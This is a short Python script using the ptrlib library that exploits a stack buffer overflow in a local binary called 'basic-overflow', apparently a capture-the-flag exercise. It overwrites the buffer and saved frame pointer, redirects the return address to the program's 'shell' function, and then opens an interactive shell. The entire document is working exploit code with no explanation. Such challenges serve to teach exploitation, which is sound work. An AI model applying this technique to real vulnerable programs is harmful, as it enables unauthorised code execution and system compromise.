from ptrlib import *

file = "./basic-overflow"
e = ELF(file)
sock = Process(file)
sock.debug = True

payload = b"A"*0x40+b"B"*8 + p64(e.symbol("shell"))
sock.sendline(payload)
sock.sh()
